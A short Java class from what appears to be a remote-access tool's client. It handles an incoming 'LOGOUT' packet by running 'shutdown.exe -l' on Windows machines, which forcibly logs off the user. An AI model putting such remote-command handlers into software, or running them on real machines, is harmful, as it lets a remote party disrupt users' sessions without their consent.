package com.redpois0n.packets.in;

public class PacketLOGOUT extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String operatingSystem = System.getProperty("os.name");
		if (operatingSystem.toLowerCase().contains("windows")) {
			Runtime.getRuntime().exec("shutdown.exe -l");
		}
	}

}
